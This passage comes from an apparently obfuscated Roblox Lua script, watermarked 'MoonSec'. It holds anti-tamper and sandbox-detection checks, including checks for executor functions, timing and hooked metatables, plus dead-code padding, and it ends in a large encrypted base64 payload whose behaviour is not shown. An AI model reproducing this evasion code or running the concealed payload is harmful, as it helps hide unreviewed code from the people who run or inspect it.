 local _ok,_err=pcall(function() error(string.char(98,54,52,54,102,98,57,57,100,54,97,101)) end)
 if _ok then _0XtLw_Oecqad() end
 if type(_err)~="string" then _0XtLw_Oecqad() end
 if not _err:find(string.char(98,54,52,54,102,98,57,57,100,54,97,101)) then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _0n_5qFR6jYWU=false
 xpcall(function() error("x") end,function() _0n_5qFR6jYWU=true end)
 if not _0n_5qFR6jYWU then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _0J4S_RdhHmQx={10,20,nil,40}
 local _count=0
 for _,_ in ipairs(_0J4S_RdhHmQx) do _count=_count+1 end
 if _count~=2 then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _0dQYvExprKB6={}
 local _k,_v=next(_0dQYvExprKB6)
 if _k~=nil or _v~=nil then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then return end
 local _ok,_0Rv0m_YI95qD=pcall(function() return _g:GetService(string.char(82,117,110,83,101,114,118,105,99,101)) end)
 if not _ok or not _0Rv0m_YI95qD then return end
 local _samples=0;local _total=0;local _0EdJUF9PVR8Q
 _0EdJUF9PVR8Q=_0Rv0m_YI95qD.Heartbeat:Connect(function(dt)
 _samples=_samples+1
 _total=_total+dt
 if _samples<10 then return end
 _0EdJUF9PVR8Q:Disconnect()
 local _avg=_total/_samples
 if _avg<0.001 or _avg>2 then _0XtLw_Oecqad() end
 end)
 end)
end
do
 pcall(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then return end
 local _ok,_0rh5iBzyp19Z=pcall(function() return _g:GetService(string.char(80,108,97,121,101,114,115)) end)
 if not _ok or not _0rh5iBzyp19Z then return end
 local _tw=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(116,121,112,101,111,102))
 if _tw and _tw(_0rh5iBzyp19Z)~=string.char(73,110,115,116,97,110,99,101) then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then return end
 local _ok,_uis=pcall(function() return _g:GetService(string.char(85,115,101,114,73,110,112,117,116,83,101,114,118,105,99,101)) end)
 if _ok and _uis then
 local _tw=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(116,121,112,101,111,102))
 if _tw and _tw(_uis)~=string.char(73,110,115,116,97,110,99,101) then _0XtLw_Oecqad() end
 end
 end)
 pcall(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then return end
 local _ok,_0HpMaC1gLisF=pcall(function() return _g.PlaceId end)
 if _ok then
 if type(_0HpMaC1gLisF)~="number" then _0XtLw_Oecqad() end
 if _0HpMaC1gLisF<0 then _0XtLw_Oecqad() end
 end
 end)
 pcall(function()
 local _ws=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(119,111,114,107,115,112,97,99,101))
 if not _ws then return end
 local _ok,_0oL6MIBBJiMm=pcall(function() return _ws.Gravity end)
 if _ok and type(_0oL6MIBBJiMm)~="number" then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then return end
 local _ok,_hs=pcall(function() return _g:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101)) end)
 if not _ok or not _hs then return end
 local _ok2,_0mGfI6yYDWPX=pcall(function() return _hs.HttpEnabled end)
 if _ok2 and type(_0mGfI6yYDWPX)~="boolean" then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then return end
 local _ok,_0KMvBXDGwqCz=pcall(function() return _g:GetService(string.char(83,99,114,105,112,116,67,111,110,116,101,120,116)) end)
 if _ok and _0KMvBXDGwqCz then
 local _tw=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(116,121,112,101,111,102))
 if _tw and _tw(_0KMvBXDGwqCz)~=string.char(73,110,115,116,97,110,99,101) then _0XtLw_Oecqad() end
 end
 end)
 pcall(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then return end
 local _ok,_ts=pcall(function() return _g:GetService(string.char(84,119,101,101,110,83,101,114,118,105,99,101)) end)
 if not _ok or not _ts then return end
 local _ok2=pcall(function() _ts:Create(nil,nil,nil) end)
 if _ok2 then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then return end
 local _ok,_rs=pcall(function() return _g:GetService(string.char(82,117,110,83,101,114,118,105,99,101)) end)
 if not _ok or not _rs then return end
 local _ok2,_0MAPuTRQHTad=pcall(function() return _rs:IsClient() end)
 local _ok3,_0XycLPKBVBrE=pcall(function() return _rs:IsServer() end)
 if _ok2 and type(_0MAPuTRQHTad)~="boolean" then _0XtLw_Oecqad() end
 if _ok3 and type(_0XycLPKBVBrE)~="boolean" then _0XtLw_Oecqad() end
 if _ok2 and _ok3 and _0MAPuTRQHTad and _0XycLPKBVBrE then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _tw=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(116,97,115,107))
 if not _tw then return end
 local _ok,_0i2FjKiZgPHZ=pcall(function() return _tw.wait(0) end)
 if _ok and type(_0i2FjKiZgPHZ)~="number" then _0XtLw_Oecqad() end
 if _ok and _0i2FjKiZgPHZ<0 then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _os=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(111,115))
 if not _os then return end
 local _oc=rawget(_os,string.char(99,108,111,99,107))
 if type(_oc)~="function" then return end
 local _0kd_MeaKL3kg=_oc()
 local _0khI59Y7gnbL=_oc()
 if type(_0kd_MeaKL3kg)~="number" then _0XtLw_Oecqad() end
 if _0khI59Y7gnbL<_0kd_MeaKL3kg then _0XtLw_Oecqad() end
 end)
end
pcall(function()
 local _b32=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(98,105,116,51,50))
 if type(_b32)~="table" then _0XtLw_Oecqad() end
 local _bx=rawget(_b32,string.char(98,120,111,114))
 if type(_bx)~="function" then _0XtLw_Oecqad() end
 if _bx(0,0)~=0 then _0XtLw_Oecqad() end
 if _bx(0xFFFF,0xFFFF)~=0 then _0XtLw_Oecqad() end
 local _tv=math.random(1,65534)
 local _tk=math.random(1,65534)
 if _bx(_bx(_tv,_tk),_tk)~=_tv then _0XtLw_Oecqad() end
end)
pcall(function()
 local _tsk=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(116,97,115,107))
 if type(_tsk)~="table" then return end
 local _methods={string.char(119,97,105,116),string.char(115,112,97,119,110),string.char(100,101,102,101,114),string.char(100,101,108,97,121)}
 for _,_m in ipairs(_methods) do
  local _f=rawget(_tsk,_m)
  if type(_f)~="function" then _0XtLw_Oecqad() end
  if debug and debug.getinfo then
   local _di=debug.getinfo(_f,"S")
   if _di and _di.what~="C" then _0XtLw_Oecqad() end
  end
 end
end)
pcall(function()
 local _tw=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(116,121,112,101,111,102))
 if type(_tw)~="function" then _0XtLw_Oecqad() end
 if _tw(1)~="number" then _0XtLw_Oecqad() end
 if _tw("x")~="string" then _0XtLw_Oecqad() end
 if _tw(true)~="boolean" then _0XtLw_Oecqad() end
 if _tw(nil)~="nil" then _0XtLw_Oecqad() end
 if _tw({})~="table" then _0XtLw_Oecqad() end
end)
pcall(function()
 local _iNew=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(73,110,115,116,97,110,99,101))
 if type(_iNew)~="table" then return end
 local _newFn=rawget(_iNew,string.char(110,101,119))
 if type(_newFn)~="function" then return end
 local _ok,_part=pcall(_newFn,"Part")
 if not _ok or not _part then return end
 local _tw=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(116,121,112,101,111,102))
 if _tw and _tw(_part)~="Instance" then _0XtLw_Oecqad() end
 local _ok2,_cn=pcall(function() return _part.ClassName end)
 if _ok2 and _cn~="Part" then _0XtLw_Oecqad() end
end)
pcall(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then return end
 local _ok=pcall(function() return _g:GetService("__FakeService_xQz__") end)
 if _ok then _0XtLw_Oecqad() end
end)
pcall(function()
 local _v3=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(86,101,99,116,111,114,51))
 if type(_v3)~="table" then return end
 local _newFn=rawget(_v3,string.char(110,101,119))
 if type(_newFn)~="function" then return end
 local _ok,_v=pcall(_newFn,1,2,3)
 if not _ok or not _v then return end
 local _ok2,_x=pcall(function() return _v.X end)
 if _ok2 and _x~=1 then _0XtLw_Oecqad() end
 local _ok3,_y=pcall(function() return _v.Y end)
 if _ok3 and _y~=2 then _0XtLw_Oecqad() end
end)
pcall(function()
 local _ss=rawget(string,string.char(115,112,108,105,116))
 if type(_ss)~="function" then return end
 local _ok,_r=pcall(_ss,"a,b,c",",")
 if not _ok or type(_r)~="table" then return end
 if #_r~=3 then _0XtLw_Oecqad() end
 if _r[1]~="a" or _r[2]~="b" or _r[3]~="c" then _0XtLw_Oecqad() end
end)
pcall(function()
 local _buf=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(98,117,102,102,101,114))
 if type(_buf)~="table" then return end
 local _create=rawget(_buf,string.char(99,114,101,97,116,101))
 local _writeu8=rawget(_buf,string.char(119,114,105,116,101,117,56))
 local _readu8=rawget(_buf,string.char(114,101,97,100,117,56))
 if type(_create)~="function" or type(_writeu8)~="function" or type(_readu8)~="function" then return end
 local _ok,_b=pcall(_create,4)
 if not _ok or not _b then return end
 local _ok2=pcall(_writeu8,_b,0,42)
 if not _ok2 then return end
 local _ok3,_v=pcall(_readu8,_b,0)
 if _ok3 and _v~=42 then _0XtLw_Oecqad() end
end)
pcall(function()
 local _grm=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,114,97,119,109,101,116,97,116,97,98,108,101))
 if type(_grm)~="function" then return end
 local _smt=_grm("")
 if type(_smt)=="table" then
  if rawget(_smt,string.char(95,95,110,97,109,101,99,97,108,108))~=nil then _0XtLw_Oecqad() end
  if rawget(_smt,string.char(95,95,110,101,119,105,110,100,101,120))~=nil then _0XtLw_Oecqad() end
 end
end)
pcall(function()
 local _ghu=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,104,117,105))
 local _gcu=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,99,111,114,101,103,117,105))
 if type(_ghu)=="function" or type(_gcu)=="function" then _0XtLw_Oecqad() end
end)
if false then
 local _0ET0_a9514425={_0Uuw4bDIdWqdjEfE0x9SaDoUwOg31kzvDJ58thoFN=47181,_0xXb0nmExi5rAkE2z9wkjkK2APMq3wQ4MrKi9BgzJ=62016,_0thAO0cl98EoQagEnAiNUtCTukEh3RsQ1GRXn4N9o=3702,_0yeMaThzEH5kVej89A1kNoN0C1l7DOFWv1XPxogv3=28593,_0i0vd334tCr7WBHk00kmqJdfKGF9xwWuxtLOA8h4L=59302,_00nIkgR6YnX4jIIu1NEKXzN82YR2hxzgewcIjIIQ8=5096,_0uljHH5ofTQOavcFUkKxEsiv86siOZ38TPqsQtrl0=6649,_0xHVA93oqeh7HdpPntJ2XGQVRQkzdIhp2D05iQMb9=49105,_085DPPsU8n8OSoToDjph0CAoa9JxAf97JBZySrsFv=62104,_0KJHKG9qNqzHEYyXFdFB6ZW7PrHAfIPR9phiZ0I4y=4591,_05AIEDuM6XnkzYUBC7wWhrr5JgqYXEHu0Hvehvf8g=16364,_0iNswZqPykpS6BkWmyFfdaZYpopdP4zpdnYqFAmiz=49782,_0Bdvx0gNoZjuhYNKC85ZDVg2AZkd29S7JE1htbQjR=40311,_0KPThFAa0dKnO80ZEVkFdERMFRmt5oxCRjwjY7XAU=30156,_0jvI82spPjcPAvSpRxtLhCjCm5KvA7auNliRMrr0s=20382,_0bIp4KPA6nRd7E9B54Bc0msapiHemB8b5gy0J4PCI=13410,_0b2lR7om9CH9oxVnVAoyDoWlEiHd9sKECfaxqxTNR=54619,_0b8gG9saay4vqSQzExBC4HClNDrGm9RAaERIdjF9u=14580,_0gh3oCAgzwVbEGuPFVVPaj4ZbyTj15jDbPfIL35Ck=61546,_0ZwJet3DN865Dz0AGMDCmbB1wTByAxsZyRuBzQfeQ=16504,_0wknsQnk5R8LkXXO9qh3j9ari9m4raNTwyuxNBw1E=32161,_0LzjBepZD0pUzIYQUHeCRKzX604ZiKTqTK02m1aQy=2137,_04bZXxpMDvNLkR8IA00WvI4VQZBn47k2I9ZdGwyKq=32286,_0j0xTqgItlWbJV69wcFkrOb0Is0yJ2Yz67D14hz2D=18771,_00BAZCQqLmakSOGaAu0O9RDnbvq1GHoFQXWgHoVhK=18712,_0lghIqzRLuxVqd7JAr2gG1TGycxVzMs7DubjC9fle=53050,_0HGLkUOScGbUI8bKsqjX6fMZ11cJo62lQMs6kgtxM=59412,_05shgmKgNtTDpAfvLi0xwcqyIuG8JYR2iAO1FI0RL=48710,_0h1PmijY0O7RKVAiXlgrdqbosYB2hM9bq5di1z7Ou=13508,_0SgjgYq4JpXQXwG61ZOlVVYQnVTg0yk0JJ9v84viQ=51608}
 _ = _0ET0_a9514425
 local _0ET1_b3add9ce={_0Kt6Vm6YVhHzisqizpY0mD2BCCQPTbI5FdhJLuL8e=10505,_06gbzPVyHksIFHmADmONAAaGPknvT5TQAHMYFDuKg=48972,_0MOXV7O7YyySJdVdRxR3hx8eXtp37FuI5M7Nsx4dj=53713,_0TWYrdGt3GC9a1TtpuyIg0DvaIfQnKOwLKxq4pImN=3786,_0NKQYNElQvu2z0t2bwNYJzNCeeZWkN93Wf67fJSZ8=15318,_0UW4iNbtF1l53Nicbye2zb2TZHlg3H9iLqbCUxeLP=2361,_0urCxBxi82QX4xOs8f2ZPdvUNDpD6mmflXDYnqGBV=53622,_0Yv7xPjHmaK6TWHSWm4LqjhUtqOhD5m5O1zAJqOU6=45896,_0reLBwwaxcnpEo29yigMAslk7BJ4ZqBoqqao3jc0M=903,_04J1q07mddB5Gbhp7MCtDkzCJgfswblhcZEXLLF1K=29820,_0QGdW7QIahigQVlDHIsMXYhCBb06Mk7x8ZYP82OQ2=9369,_0CO5gwoucI8qfn7L96eNSqCdF49XTWIr7fT6ssKNA=60366,_0vAQHmCIyeFVLSUtfyggkT3YNbKlokxFaCSHPnWis=44487,_0aLfgfcwwdmYA4Ra5Z7JIdv0K415pNwZC3RzXbjKX=17513,_0GMZZzEPAoeSKEBfJNbT0GWq8hipmnOnQJ6L0eZL4=23694,_0sS66k9wAwzDgzpLjHPIKgOuAbEkz8lfkh5QCNaKc=62091,_0dGdifCdx3aAxziP12SE7x53nshHFm2gFjOb3LIlK=37989,_0sm1GM4qnvc700bvRf3x8yYgxOrnDYuoJYkclqzPd=28269,_00UZ6WkGbLbewWWqswQzGkAM6LwfQdUxXkjpjfE3n=44139,_0dwKoeJ1ttXJyxObd7uKWQdZEuj1W5pTc9yVK83th=40510,_0gDtxzCDinXezP86zTvYQllbXdg0gDBDSkwNK144q=33009,_0GbCIQ5VcgR48sYMqPrXIZ9brpAp9QoqjopZm8BYr=39765,_0Bui9kc11vTuGpONy13HC2gdxBpsRYhadHtrSWoIH=63933,_0DobL0QBXJvmQEvDeECMu6KZ5l9q44SJ89JJ6PbGw=58674,_03OG4srL9ChUyRcU4pHdIBVexgUVGlaP0zlnsoXcY=8139,_0Ot4qW8a8Vb3weHF0JgBi6OL0IegAzDdcSpvJu3Hx=19575,_0vyFfNZdNg3CtyWIevExUfmyY02tsHlo7VXy5RhbU=20566,_0FheyiRywzwRK2fuI8NV9QURyzZN80hdh6rIbm1K2=32848,_0E9iswafCLbt8CfaktA9IvcPj21Xg0JY5YI5oOv2I=21346,_0cnEN5wSDWpCFsH3JDpD20PXXMKnnI0Z26rbDElw9=56832}
 _ = _0ET1_b3add9ce
end

if false then
 local _MS_ID=251188072
 local function MOONSEC_EXIT() end
 local function MS_WATERMARK(_0GKL5jKP) end
 MS_WATERMARK("251188072")
 local _MOONSEC_VERSION="3.0.3"
 MOONSEC_EXIT()
end
local _0XUe={148,251,118,230,60,101,201,25,191,133,127,56,76,54,151,51,27,244,162,218,161,80,152,64,67,75,169,217,141,240,144,247,130,182,9,173,254,211,24,55,183,27,21,27,37,49,24,23}
local _0Kf8="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